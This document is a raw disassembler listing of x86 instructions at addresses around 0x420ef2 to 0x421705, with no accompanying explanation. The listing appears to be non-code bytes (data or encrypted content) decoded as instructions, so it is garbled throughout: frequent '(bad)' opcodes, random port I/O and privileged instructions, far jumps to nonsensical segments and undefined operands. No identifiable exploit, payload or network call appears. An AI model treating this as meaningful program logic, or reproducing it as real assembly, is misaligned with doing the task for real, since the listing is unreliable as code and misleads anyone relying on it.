  420ef2:	bound  esi,QWORD PTR [ebx+0x5b]
  420ef5:	jbe    0x420eda
  420ef7:	icebp  
  420ef8:	dec    ecx
  420ef9:	mov    edi,DWORD PTR [edx]
  420efb:	(bad)  
  420efc:	pop    DWORD PTR [edx]
  420efe:	mov    ecx,0xc5d308e2
  420f03:	dec    ebx
  420f04:	fcom   DWORD PTR [ecx-0x912e6fa]
  420f0a:	lods   eax,DWORD PTR ds:[esi]
  420f0b:	push   edi
  420f0c:	inc    esp
  420f0d:	ret    
  420f0e:	popf   
  420f0f:	cs jns 0x420f67
  420f12:	sub    DWORD PTR [edx+0x24],esi
  420f15:	and    eax,0x822eab7a
  420f1a:	cmp    ebp,DWORD PTR [edi+0x5a]
  420f1d:	out    0xfe,eax
  420f1f:	test   eax,0x1596364e
  420f24:	ret    
  420f25:	ret    0x6295
  420f28:	jo     0x420f9e
  420f2a:	test   al,0xa4
  420f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f2d:	xor    dl,cl
  420f2f:	dec    edi
  420f30:	int    0x4a
  420f32:	add    DWORD PTR [ecx-0x48365094],ebp
  420f38:	sub    ebx,DWORD PTR [ebp-0x16da1811]
  420f3e:	aas    
  420f3f:	outs   dx,DWORD PTR ds:[esi]
  420f40:	xchg   edi,eax
  420f41:	lea    eax,[ecx+0x62]
  420f44:	add    eax,0xc118dadd
  420f49:	push   ecx
  420f4a:	xchg   ebp,eax
  420f4b:	jbe    0x420fbb
  420f4d:	adc    al,0x15
  420f4f:	or     eax,0x16508e1c
  420f54:	lods   al,BYTE PTR ds:[esi]
  420f55:	pop    ecx
  420f56:	fcom   QWORD PTR [esi+edx*4+0x39508e9]
  420f5d:	inc    esi
  420f5e:	jb     0x420f88
  420f60:	stc    
  420f61:	(bad)
  420f64:	push   ecx
  420f65:	mov    DWORD PTR [ecx+eiz*8],edx
  420f68:	adc    DWORD PTR [edx+eiz*4+0x555a0dc4],esp
  420f6f:	mov    bl,0x34
  420f71:	dec    esp
  420f72:	adc    al,0x4f
  420f74:	(bad)  
  420f75:	mov    eax,es:0x778820e2
  420f7b:	or     al,0x86
  420f7d:	cwde   
  420f7e:	dec    edi
  420f7f:	mov    esi,0x9e847ac2
  420f84:	inc    edi
  420f85:	adc    DWORD PTR [esi-0x21],eax
  420f88:	test   edx,edi
  420f8a:	aas    
  420f8b:	add    BYTE PTR [ecx-0x31],bl
  420f8e:	in     eax,dx
  420f8f:	sbb    BYTE PTR [ecx-0x16],0x33
  420f93:	(bad)  
  420f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f95:	cmp    cl,BYTE PTR ss:[ebx-0x67]
  420f99:	add    al,0xe
  420f9b:	mov    WORD PTR [eax+0x7cde0060],gs
  420fa1:	ret    0xb386
  420fa4:	and    BYTE PTR [ebp+0x6c],ah
  420fa7:	(bad)  
  420fa8:	xlat   BYTE PTR ds:[ebx]
  420fa9:	in     al,0x5e
  420fab:	fadd   DWORD PTR [ebp-0x6a]
  420fae:	cs pop edx
  420fb0:	sub    al,0x9c
  420fb2:	fidivr WORD PTR [ecx-0x20b955a5]
  420fb8:	cwde   
  420fb9:	mov    edx,0x6e8d2154
  420fbe:	jae    0x420f65
  420fc0:	mov    ds:0x324d5583,eax
  420fc5:	push   es
  420fc6:	push   edi
  420fc7:	retf   0x41ef
  420fca:	imul   edi,DWORD PTR [eax+edi*2-0x78c219d9],0x309aca09
  420fd5:	pop    esi
  420fd6:	lods   eax,DWORD PTR ds:[esi]
  420fd7:	mov    ds:0x9d1c1aaa,eax
  420fdc:	loop   0x421036
  420fde:	sbb    BYTE PTR [ebx],bh
  420fe0:	scas   al,BYTE PTR es:[edi]
  420fe1:	out    dx,al
  420fe2:	lahf   
  420fe3:	push   edx
  420fe4:	add    al,0xd
  420fe6:	sub    edx,DWORD PTR [esi+0x6a]
  420fe9:	and    edx,DWORD PTR [eax-0x5a31984]
  420fef:	ror    BYTE PTR [edx+0x84cd174],cl
  420ff5:	xlat   BYTE PTR ds:[ebx]
  420ff6:	sub    eax,0x51b959
  420ffb:	mov    ah,0x27
  420ffd:	mov    dh,0x71
  420fff:	into   
  421000:	xchg   ebp,eax
  421001:	sbb    BYTE PTR [edi+0x19],dl
  421004:	int3   
  421005:	in     al,dx
  421006:	js     0x421061
  421008:	lock xlat BYTE PTR gs:[ebx]
  42100b:	push   es
  42100c:	ret    0xf48d
  42100f:	test   eax,0x169afe00
  421014:	xchg   ebx,eax
  421015:	adc    bl,BYTE PTR [eax+0x196224a0]
  42101b:	std    
  42101c:	adc    al,0x8
  42101e:	std    
  42101f:	cdq    
  421020:	jl     0x42104f
  421022:	mov    bh,0xaf
  421024:	inc    ebp
  421025:	jmp    0x42106e
  421027:	sub    ebx,ebx
  421029:	xchg   edi,eax
  42102a:	cmp    DWORD PTR [edi+0x718620e2],edx
  421030:	and    DWORD PTR [edx],ebx
  421032:	retf   0x31b6
  421035:	in     eax,0x94
  421037:	jnp    0x42107f
  421039:	xchg   ebp,eax
  42103a:	adc    DWORD PTR fs:[edi],edi
  42103d:	jmp    0x420fd5
  42103f:	mov    ebx,0xafbeec33
  421044:	sahf   
  421045:	pushf  
  421046:	dec    edi
  421047:	inc    ebx
  421048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421049:	cli    
  42104a:	imul   ebx,DWORD PTR [esi+0x50],0xfffffffb
  42104e:	mov    edx,0x2e59b2e2
  421053:	out    dx,eax
  421054:	(bad)  
  421056:	xor    DWORD PTR [ebx],ecx
  421058:	cwde   
  421059:	inc    ebp
  42105a:	call   0x446ff69e
  42105f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  421061:	(bad)  
  421062:	lds    eax,FWORD PTR ss:[edx]
  421065:	cmp    al,0x56
  421067:	push   cs
  421068:	mov    edx,DWORD PTR gs:[ebx+0x2896c032]
  42106f:	js     0x42108c
  421071:	mov    DWORD PTR [esi+0x408dab2a],esi
  421077:	sar    BYTE PTR [eax+0x6b04f77e],cl
  42107d:	sub    ebx,DWORD PTR [ebx+0x35]
  421080:	dec    DWORD PTR [ebx+edx*2-0x6f]
  421084:	std    
  421085:	mov    esi,0xd33a3bb0
  42108a:	or     eax,0xdfba
	...
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	xor    cl,BYTE PTR [ebx+0x51]
  4210a9:	int    0xef
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    bl,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR ds:0x294be346,ch
  4210b7:	jg     0x4210ab
  4210b9:	mov    dh,0x88
  4210bb:	push   0xa2ac5121
  4210c0:	xchg   DWORD PTR [edx],edx
  4210c2:	(bad)  
  4210c4:	rcl    BYTE PTR [edi+ebp*4],1
  4210c7:	(bad)  
  4210c8:	out    dx,eax
  4210c9:	dec    esi
  4210ca:	stos   DWORD PTR es:[edi],eax
  4210cb:	jg     0x4210d8
  4210cd:	inc    esp
  4210ce:	push   ebx
  4210cf:	data16 mov ds:0x9df226b9,al
  4210d5:	mov    DWORD PTR [eax-0x1f5c7f97],esp
  4210db:	ja     0x4210c5
  4210dd:	cdq    
  4210de:	cmc    
  4210df:	mov    cl,0x93
  4210e1:	dec    edi
  4210e2:	into   
  4210e3:	inc    ecx
  4210e4:	jbe    0x421133
  4210e6:	push   esi
  4210e7:	push   0xd3e9ff26
  4210ec:	fstp   st(4)
  4210ee:	pushf  
  4210ef:	fist   DWORD PTR [ebx]
  4210f1:	arpl   WORD PTR [edx+0x4daad1c0],cx
  4210f7:	cdq    
  4210f8:	sar    DWORD PTR [ecx],cl
  4210fa:	sub    eax,0xf77abdb4
  4210ff:	dec    ebp
  421100:	out    0x43,al
  421102:	sar    BYTE PTR [esi+ebp*8+0x11838da5],cl
  421109:	retf   0x879f
  42110c:	xchg   DWORD PTR [edx-0x1e],edx
  42110f:	ja     0x4210ed
  421111:	cmp    eax,0xa46e312a
  421116:	mov    bl,0xc6
  421118:	or     BYTE PTR [ebx-0x66b39504],dl
  42111e:	popa   
  42111f:	adc    al,0x7a
  421121:	int3   
  421122:	rcl    ebx,1
  421124:	data16 lods al,BYTE PTR ds:[esi]
  421126:	push   esp
  421127:	add    BYTE PTR [ecx],dl
  421129:	rcr    esp,cl
  42112b:	or     DWORD PTR [edx-0x15],0x33f1ed86
  421132:	neg    BYTE PTR es:[ecx+0x660e2dde]
  421139:	adc    ecx,DWORD PTR [esi]
  42113b:	(bad)  
  42113c:	mov    eax,0x841119a7
  421141:	mov    bl,ch
  421143:	mov    al,0x32
  421145:	jns    0x4211ac
  421147:	int3   
  421148:	xchg   edx,eax
  421149:	inc    eax
  42114a:	popa   
  42114b:	cmp    esp,DWORD PTR [ebp-0x92c656c]
  421151:	clc    
  421152:	inc    ebp
  421153:	inc    ebp
  421154:	shufps xmm3,XMMWORD PTR [edx-0x1c],0x17
  421159:	sbb    eax,0x435b64d3
  42115e:	push   0xffffffc3
  421160:	rol    DWORD PTR [ebp+0x5ce53981],cl
  421166:	or     DWORD PTR [esi+0x2dffa579],0xbee65b6e
  421170:	mov    WORD PTR [edx+0x5],?
  421173:	mov    ch,0xad
  421175:	mov    edi,0xe589a5f3
  42117a:	and    DWORD PTR [ecx-0xfa2de5f],0xb
  421181:	inc    esp
  421182:	mov    bh,0xa4
  421184:	div    DWORD PTR [eax+eiz*1+0x27424cde]
  42118b:	cmp    al,0xeb
  42118d:	inc    ebp
  42118e:	aas    
  42118f:	imul   esi,DWORD PTR [ecx+0x68],0xc9b0ad1
  421196:	inc    ebp
  421197:	mov    dl,0xdd
  421199:	pushf  
  42119a:	jp     0x4211ae
  42119c:	outs   dx,BYTE PTR ds:[esi]
  42119d:	ret    0x550a
  4211a0:	out    0x46,eax
  4211a2:	add    ch,BYTE PTR [ebx]
  4211a4:	icebp  
  4211a5:	and    eax,0xa2158f8b
  4211aa:	push   esp
  4211ab:	inc    esp
  4211ac:	cwde   
  4211ad:	sub    ebp,ebx
  4211af:	pop    bx
  4211b1:	xchg   esp,eax
  4211b2:	loopne 0x421196
  4211b4:	fstp   TBYTE PTR [edi]
  4211b6:	mov    cl,0x47
  4211b8:	(bad)  
  4211b9:	xchg   ebp,eax
  4211ba:	and    bl,dl
  4211bc:	and    edx,DWORD PTR [ebx+0x15181f3f]
  4211c2:	ror    edx,0x48
  4211c5:	hlt    
  4211c6:	or     DWORD PTR [edi+0x80a7f64],edx
  4211cc:	retf   
  4211cd:	sbb    eax,0xf4d602ed
  4211d2:	jle    0x4211b0
  4211d4:	push   esi
  4211d5:	bound  ebp,QWORD PTR [ecx]
  4211d7:	mov    eax,ds:0x52a02af5
  4211dc:	popa   
  4211dd:	jo     0x421234
  4211df:	jb     0x4211ae
  4211e1:	sbb    bl,ch
  4211e3:	lea    ecx,[ebx-0x77]
  4211e6:	loopne 0x421217
  4211e8:	adc    eax,0x14448714
  4211ed:	jle    0x4211a9
  4211ef:	shr    bl,0x69
  4211f2:	addr16 js 0x4211a0
  4211f5:	fimul  DWORD PTR [eax]
  4211f7:	scas   al,BYTE PTR es:[edi]
  4211f8:	ret    0x8639
  4211fb:	retf   0xcc18
  4211fe:	jmp    0xb079b542
  421203:	fs mov eax,0x7cd6cf7e
  421209:	mov    dl,0x60
  42120b:	adc    BYTE PTR [esi],0x4b
  42120e:	push   ebp
  42120f:	out    0xa0,al
  421211:	sub    ecx,DWORD PTR [ecx]
  421213:	xchg   ebp,eax
  421214:	cdq    
  421215:	jbe    0x421281
  421217:	push   0x5f
  421219:	in     eax,0x95
  42121b:	(bad)  
  42121d:	push   ss
  42121e:	popa   
  42121f:	mov    eax,gs:0x2ed4d3c3
  421225:	shl    BYTE PTR [ebp+0x54],0x22
  421229:	ja     0x42126b
  42122b:	xlat   BYTE PTR ds:[ebx]
  42122c:	fstp   QWORD PTR ds:0x31020511
  421232:	push   ecx
  421233:	icebp  
  421234:	cli    
  421235:	ja     0x421245
  421237:	leave  
  421238:	mov    ecx,0xd24ff870
  42123d:	into   
  42123e:	in     eax,dx
  42123f:	fnstsw WORD PTR [edx]
  421241:	mov    WORD PTR [esi],?
  421243:	mov    esp,0x27003f3a
  421248:	(bad)  
  421249:	hlt    
  42124a:	sbb    BYTE PTR [ecx],ch
  42124c:	out    dx,eax
  42124d:	imul   ebp,DWORD PTR [esp+eax*1],0x7
  421251:	call   0x25cc:0x57bf2aae
  421258:	or     DWORD PTR [eax-0x1f0e9df1],esi
  42125e:	popf   
  42125f:	pop    ds
  421260:	ficom  WORD PTR [ebp+0x73]
  421263:	fwait
  421264:	and    DWORD PTR [ecx],esi
  421266:	mov    dh,BYTE PTR [ecx]
  421268:	inc    edi
  421269:	or     BYTE PTR [ecx],bh
  42126b:	fcomip st,st(4)
  42126d:	shl    DWORD PTR [ebx],cl
  42126f:	or     BYTE PTR [esi+ebp*1-0x11fd837f],al
  421276:	sar    DWORD PTR [eax-0x27],0x8e
  42127a:	push   ss
  42127b:	ror    BYTE PTR [ebx+0x2d],1
  42127e:	std    
  42127f:	ss loopne 0x421269
  421282:	ss push eax
  421284:	jns    0x421282
  421286:	neg    BYTE PTR [ebp-0x29]
  421289:	mov    edi,0x759443b4
  42128e:	push   es
  42128f:	fs pop ecx
  421291:	btc    DWORD PTR ds:0xcad27a42,ebx
  421298:	mov    eax,0x4e66c0aa
  42129d:	(bad)  
  42129e:	jp     0x4212a7
  4212a0:	aas    
  4212a1:	pop    esp
  4212a2:	jge    0x42122d
  4212a4:	sahf   
  4212a5:	and    eax,0x7f6e6b2b
  4212aa:	in     eax,0xa7
  4212ac:	adc    al,BYTE PTR [eax]
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0x53e0bfb7]
  4212ca:	jmp    0x1:0xfb00018e
  4212d1:	add    dl,bh
  4212d3:	jns    0x4212ae
  4212d5:	ds (bad) 
  4212d7:	jns    0x42129d
  4212d9:	jp     0x421288
  4212db:	call   0xa083:0xb7b5653
  4212e2:	lahf   
  4212e3:	(bad)  
  4212e4:	lods   al,BYTE PTR ds:[esi]
  4212e5:	int    0x10
  4212e7:	push   es
  4212e8:	lea    esp,[ebx-0x13693c04]
  4212ee:	and    ch,BYTE PTR [esi+ebp*1+0x7a]
  4212f2:	repz push ebp
  4212f4:	loop   0x421328
  4212f6:	and    DWORD PTR [ebx],ecx
  4212f8:	arpl   WORD PTR [ebp+ecx*2+0x45c8005f],di
  4212ff:	push   ds
  421300:	pop    ecx
  421301:	(bad)  
  421302:	sub    dh,BYTE PTR [edx*1-0x4cccca20]
  421309:	mov    cl,dh
  42130b:	(bad)  
  42130c:	adc    al,0xc5
  42130e:	sahf   
  42130f:	jmp    0x8456:0xcca70f4
  421316:	xor    DWORD PTR [ecx+0x28],esp
  421319:	(bad)  
  42131a:	pcmpeqw mm5,QWORD PTR [ebx-0x590417d8]
  421321:	test   eax,0xea700394
  421326:	ret    0xdfb3
  421329:	in     eax,0x2a
  42132b:	rol    bl,cl
  42132d:	ror    ah,cl
  42132f:	xor    BYTE PTR [esi-0x39cc0592],bl
  421335:	leave  
  421336:	mov    esp,0x3ce294f6
  42133b:	or     esp,esi
  42133d:	addr16 xchg ebx,eax
  42133f:	popf   
  421340:	ins    DWORD PTR es:[edi],dx
  421341:	push   0xa29ea3d6
  421346:	xchg   ebp,eax
  421347:	fwait
  421348:	lock jg 0x42131b
  42134b:	add    esi,DWORD PTR [ebp-0x4f6822e0]
  421351:	and    BYTE PTR [edi-0x3b],0xe8
  421355:	(bad)  
  421356:	mov    di,WORD PTR ds:0x2103ba8b
  42135d:	call   0x71fa6a9a
  421362:	int3   
  421363:	out    0xf1,al
  421365:	(bad)  
  421366:	adc    esp,esp
  421368:	jle    0x4213a1
  42136a:	data16 cmc 
  42136c:	scas   eax,DWORD PTR es:[edi]
  42136d:	aam    0x2b
  42136f:	ret    
  421370:	popa   
  421371:	ret    
  421372:	push   ebx
  421373:	pop    eax
  421374:	bound  esi,QWORD PTR [edi-0x7163c1f9]
  42137a:	jno    0x421320
  42137c:	and    edx,DWORD PTR [edi+0x25]
  42137f:	sub    eax,ecx
  421381:	lea    eax,[ebx+0x4968fc4a]
  421387:	(bad)
  42138b:	push   eax
  42138c:	mov    ah,0xbe
  42138e:	xchg   BYTE PTR [edx+0x6c724aa2],bl
  421394:	mov    ecx,0x76223444
  421399:	and    DWORD PTR [edx],esp
  42139b:	inc    esp
  42139c:	sub    BYTE PTR [ecx+ebx*4+0x1aa19fc],ah
  4213a3:	(bad)  
  4213a4:	fwait
  4213a5:	hlt    
  4213a6:	sbb    BYTE PTR ss:[ebx],dh
  4213a9:	adc    eax,DWORD PTR [esi-0x59e9c56e]
  4213af:	mov    dh,0x4a
  4213b1:	(bad)  
  4213b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213b3:	mov    ah,0xb5
  4213b5:	push   ebp
  4213b6:	lds    esp,FWORD PTR [edi+0x4f]
  4213b9:	call   0x8883:0x4dde76d6
  4213c0:	sbb    al,0x92
  4213c2:	jnp    0x421383
  4213c4:	adc    DWORD PTR [eax+ebx*2-0x35dcc7c0],edx
  4213cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213cc:	pop    ss
  4213cd:	(bad)  
  4213cf:	outs   dx,BYTE PTR ds:[esi]
  4213d0:	and    BYTE PTR [esi+ebp*2+0x54],dh
  4213d4:	out    0xed,al
  4213d6:	ret    
  4213d7:	xor    ah,BYTE PTR [ebx]
  4213d9:	mov    ds:0xa35bf2cb,eax
  4213de:	popa   
  4213df:	mov    BYTE PTR [edx+0x25],bh
  4213e2:	mov    dh,0x1e
  4213e4:	push   0x35
  4213e6:	imul   ebp,DWORD PTR [esp+ebp*1-0x45b7723c],0x5a
  4213ee:	push   DWORD PTR [ebp+0x7631df7e]
  4213f4:	inc    ebx
  4213f5:	push   ss
  4213f6:	mov    al,ds:0x34a6a266
  4213fb:	es inc esp
  4213fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213fe:	gs mov ebx,0x8006d316
  421404:	neg    ebx
  421406:	xor    BYTE PTR [ebx+0xa],cl
  421409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42140a:	mov    WORD PTR [edi],es
  42140c:	idiv   edi
  42140e:	and    BYTE PTR [esi+0x6d897bd2],cl
  421414:	push   edx
  421415:	mov    eax,ds:0x6c98265a
  42141a:	rol    DWORD PTR [ecx-0x211e961f],cl
  421420:	adc    DWORD PTR [ecx-0x3c6a2050],esi
  421426:	shl    BYTE PTR [edi+0x2721fed4],cl
  42142c:	add    eax,0x62098d11
  421431:	dec    eax
  421432:	cmc    
  421433:	or     eax,0x16c6e6a9
  421438:	mov    ecx,0x5b6a282f
  42143d:	arpl   WORD PTR [eax+0x2fd6d193],di
  421443:	sahf   
  421444:	ja     0x421450
  421446:	bound  ecx,QWORD PTR [esi-0x47]
  421449:	mov    ds:0xb7e973e0,al
  42144e:	fxch   st(2)
  421450:	lea    esp,[ebx+0x34]
  421453:	and    eax,0x765ae378
  421458:	xchg   ebx,eax
  421459:	jne    0x4214cd
  42145b:	sti    
  42145c:	sahf   
  42145d:	inc    eax
  42145e:	jne    0x421441
  421460:	sahf   
  421461:	fwait
  421462:	stos   BYTE PTR es:[edi],al
  421463:	mov    ebx,0x97c89dcd
  421468:	fbstp  TBYTE PTR [esi-0x6c]
  42146b:	stos   BYTE PTR es:[edi],al
  42146c:	shl    BYTE PTR [esi],1
  42146e:	and    al,0x1
  421470:	push   edx
  421471:	aam    0x3e
  421473:	bound  edx,QWORD PTR [ebp+0x52]
  421476:	jle    0x42142a
  421478:	mov    al,ds:0x1d19c302
  42147d:	xor    ebp,ecx
  42147f:	sub    al,0x9
  421481:	inc    edi
  421482:	imul   BYTE PTR [esi]
  421484:	xchg   edx,eax
  421485:	pop    ds
  421486:	mov    ch,0x98
  421488:	sub    eax,0x4bf49f6d
  42148d:	mov    DWORD PTR [ecx-0x7d],ebp
  421490:	mov    ebp,0x7ad5e138
  421495:	ret    0x5f1f
  421498:	push   ebp
  421499:	lods   eax,DWORD PTR ds:[esi]
  42149a:	repnz add al,0x68
  42149d:	nop
  42149e:	imul   ebx,DWORD PTR [ecx+0x39],0x68
  4214a2:	test   al,0x3c
  4214a4:	sti    
  4214a5:	mov    al,ds:0xd53bffe6
  4214aa:	xchg   DWORD PTR [esi],edx
  4214ac:	dec    bp
  4214ae:	mov    ecx,0x63705f37
  4214b3:	push   esp
  4214b4:	pop    es
  4214b5:	jns    0x4214af
  4214b7:	das    
  4214b8:	daa    
  4214b9:	stc    
  4214ba:	cmp    DWORD PTR [esp+ebx*8-0x54ab4a22],ebp
  4214c1:	arpl   di,bx
  4214c3:	mov    dh,0x58
  4214c5:	add    al,0xf8
  4214c7:	rcr    eax,1
  4214c9:	not    DWORD PTR cs:[ebx]
  4214cc:	jo     0x4214ce
	...
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	in     al,dx
  4214e7:	push   cs
  4214e8:	sbb    ch,BYTE PTR ds:0x190e5
  4214ee:	sti    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [eax-0x6c],al
  4214f4:	push   eax
  4214f5:	arpl   WORD PTR [edx],cx
  4214f7:	in     al,0xfa
  4214f9:	pop    ebx
  4214fa:	fstp   TBYTE PTR [ebx-0x27dbbc5a]
  421500:	jecxz  0x421528
  421502:	push   eax
  421503:	sahf   
  421504:	in     al,dx
  421505:	or     BYTE PTR [esi],0xa
  421508:	lahf   
  421509:	push   edx
  42150a:	push   edx
  42150b:	or     dh,ah
  42150d:	and    al,0x13
  42150f:	fldcw  WORD PTR [eax+edx*4]
  421512:	inc    edi
  421513:	cmp    eax,0xb7094e61
  421518:	cld    
  421519:	iret   
  42151a:	shr    edx,1
  42151c:	inc    edi
  42151d:	sbb    DWORD PTR [ecx],edx
  42151f:	gs pop edi
  421521:	push   ss
  421522:	popa   
  421523:	call   0x93c4:0xeda0fb88
  42152a:	mov    al,ds:0xcabacc55
  42152f:	fisubr DWORD PTR [esi+0x5fb8f7d6]
  421535:	scas   eax,DWORD PTR es:[edi]
  421536:	stc    
  421537:	mov    ch,dh
  421539:	mov    edx,0xee91d9e1
  42153e:	xchg   DWORD PTR [edi],ebp
  421540:	inc    ebx
  421541:	neg    al
  421543:	loopne 0x4215a1
  421545:	inc    esi
  421546:	pop    ds
  421547:	mov    bh,0xde
  421549:	xor    dl,BYTE PTR ds:0xcf3f1222
  42154f:	dec    esi
  421550:	hlt    
  421551:	pop    eax
  421552:	jp     0x42150f
  421554:	in     eax,dx
  421555:	aas    
  421556:	dec    eax
  421557:	test   al,0xda
  421559:	pop    ds
  42155a:	stc    
  42155b:	add    BYTE PTR [ecx],dh
  42155d:	int    0x2
  42155f:	jecxz  0x42155a
  421561:	sti    
  421562:	addr16 pop ebx
  421564:	fwait
  421565:	or     ebx,esp
  421567:	iret   
  421568:	cmc    
  421569:	dec    esp
  42156a:	fld    TBYTE PTR [edx]
  42156c:	or     ch,BYTE PTR [edx]
  42156e:	jmp    0x9cec1bd4
  421573:	cmp    ebx,esi
  421575:	fcomip st,st(5)
  421577:	lock sbb al,0x26
  42157a:	test   BYTE PTR [ebx+ecx*8-0x47],ah
  42157e:	fdiv   QWORD PTR [edx+0x3]
  421581:	fsubr  QWORD PTR [ecx]
  421583:	xchg   edx,eax
  421584:	jmp    0x44b3:0xcd690cdc
  42158b:	pop    ds
  42158c:	popa   
  42158d:	ins    DWORD PTR es:[edi],dx
  42158e:	xlat   BYTE PTR ds:[ebx]
  42158f:	xor    eax,0xc7886f1c
  421594:	addr16 std 
  421596:	nop
  421597:	rol    DWORD PTR [ebx],0x3a
  42159a:	lahf   
  42159b:	inc    ebp
  42159c:	in     al,0x97
  42159e:	push   edx
  42159f:	push   ebx
  4215a0:	jno    0x421617
  4215a2:	fcomi  st,st(4)
  4215a4:	pop    edx
  4215a5:	loope  0x4215a4
  4215a7:	mov    ds:0xa26560f0,eax
  4215ac:	xor    DWORD PTR [ecx],ecx
  4215ae:	hlt    
  4215af:	jno    0x4215c8
  4215b1:	aad    0xbe
  4215b3:	test   al,0xec
  4215b5:	jne    0x4215ec
  4215b7:	sar    ebx,0x20
  4215ba:	adc    DWORD PTR [ecx+0x6b],esp
  4215bd:	or     eax,0x883659f4
  4215c2:	iret   
  4215c3:	sbb    al,0x3d
  4215c5:	or     esi,0xa63c5b99
  4215cb:	adc    cl,ch
  4215cd:	call   0x4f8f:0xbef91cad
  4215d4:	mov    dl,0xa9
  4215d6:	std    
  4215d7:	xor    edx,ebp
  4215d9:	into   
  4215da:	push   ebp
  4215db:	shl    DWORD PTR [eax-0x50],cl
  4215de:	repz in al,dx
  4215e0:	lahf   
  4215e1:	addr16 add eax,0x3bfd4ed
  4215e7:	inc    edi
  4215e8:	imul   esi,DWORD PTR [eax-0x76698d01],0xffffff86
  4215ef:	sbb    DWORD PTR [eax+0xe],ecx
  4215f2:	add    eax,esi
  4215f4:	pop    ecx
  4215f5:	push   eax
  4215f6:	in     al,0xa6
  4215f8:	imul   edx,edx,0xffffff80
  4215fb:	jns    0x421632
  4215fd:	push   edx
  4215fe:	jne    0x421632
  421600:	bound  ebx,QWORD PTR [ebp+0x70a77434]
  421606:	fisubr DWORD PTR [edx+0x35af4973]
  42160c:	pop    es
  42160d:	cmp    ecx,ebx
  42160f:	les    ebp,FWORD PTR [edi+eax*8-0x11]
  421613:	jg     0x421630
  421615:	pop    ebp
  421616:	ins    BYTE PTR es:[edi],dx
  421617:	(bad)  
  421618:	mov    al,0xde
  42161a:	jno    0x4215c9
  42161c:	cli    
  42161d:	xchg   esi,esi
  42161f:	js     0x421671
  421621:	xabort 0x8a
  421624:	and    BYTE PTR [edi+0x4b],ah
  421627:	cmc    
  421628:	xor    edi,0x9fb60ebd
  42162e:	ins    DWORD PTR es:[edi],dx
  42162f:	scas   eax,DWORD PTR es:[edi]
  421630:	jo     0x4215f4
  421632:	cli    
  421633:	sahf   
  421634:	jle    0x421619
  421636:	adc    BYTE PTR [eax-0x7f7aa710],ch
  42163c:	adc    esp,DWORD PTR [ebp-0x60]
  42163f:	sub    al,0x72
  421641:	jle    0x4216b4
  421643:	dec    esp
  421644:	stc    
  421645:	push   esp
  421646:	and    al,0x69
  421648:	test   BYTE PTR [eax+edx*8+0x2a],0x24
  42164d:	jle    0x4215fe
  42164f:	(bad)  
  421650:	jmp    0xba773220
  421655:	mov    eax,ds:0xeb9a9a39
  42165a:	lods   eax,DWORD PTR ds:[esi]
  42165b:	cmc    
  42165c:	mov    dl,0x7f
  42165e:	xchg   ebp,eax
  42165f:	push   esp
  421660:	pop    eax
  421661:	jne    0x4215eb
  421663:	mov    es,WORD PTR [eax]
  421665:	sub    ah,BYTE PTR [esi+0x7d]
  421668:	add    edi,edi
  42166a:	clc    
  42166b:	jmp    0x42166f
  42166d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42166f:	pop    eax
  421670:	push   eax
  421671:	jmp    0x8fe1:0xff90e8c9
  421678:	out    dx,al
  421679:	mov    ah,0x2e
  42167b:	mov    al,ds:0xcc2f7da0
  421680:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421682:	scas   al,BYTE PTR es:[edi]
  421683:	js     0x42165e
  421685:	pop    ecx
  421686:	add    bl,BYTE PTR [edi+0xb]
  421689:	lods   eax,DWORD PTR ds:[esi]
  42168a:	arpl   cx,dx
  42168c:	pop    ss
  42168d:	mov    ebx,0x37465e7e
  421692:	int3   
  421693:	sbb    DWORD PTR ss:[edi+0x76698d22],0x75
  42169b:	pushf  
  42169c:	in     al,dx
  42169d:	add    al,cl
  42169f:	aas    
  4216a0:	mov    ?,WORD PTR [ecx+ebx*1+0x1d]
  4216a4:	jnp    0x4216b0
  4216a6:	dec    ebp
  4216a7:	jecxz  0x421714
  4216a9:	out    dx,eax
  4216aa:	daa    
  4216ab:	jecxz  0x42162d
  4216ad:	mov    bh,BYTE PTR [edx]
  4216af:	push   0x4e
  4216b1:	pop    esi
  4216b2:	xchg   BYTE PTR [edx+0x61],bh
  4216b5:	lods   al,BYTE PTR ds:[esi]
  4216b6:	jne    0x421737
  4216b8:	fs fcmovb st,st(2)
  4216bb:	adc    al,0x62
  4216bd:	js     0x4216ee
  4216bf:	add    BYTE PTR [ebx+eiz*2+0x72ee91bb],bh
  4216c6:	pop    es
  4216c7:	or     ah,ch
  4216c9:	loop   0x4216c7
  4216cb:	stos   DWORD PTR es:[edi],eax
  4216cc:	fsub   DWORD PTR [ecx+0x775e12ba]
  4216d2:	push   0xffffffd2
  4216d4:	jecxz  0x421677
  4216d6:	inc    ebp
  4216d7:	out    0x34,al
  4216d9:	jg     0x4216a9
  4216db:	fstp   DWORD PTR [ebp+0x5946af68]
  4216e1:	(bad)  [esi+ebp*4+0x34994a55]
  4216e8:	loop   0x421714
  4216ea:	rcl    DWORD PTR [ebx+0xa6],1
	...
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	neg    BYTE PTR [edi]
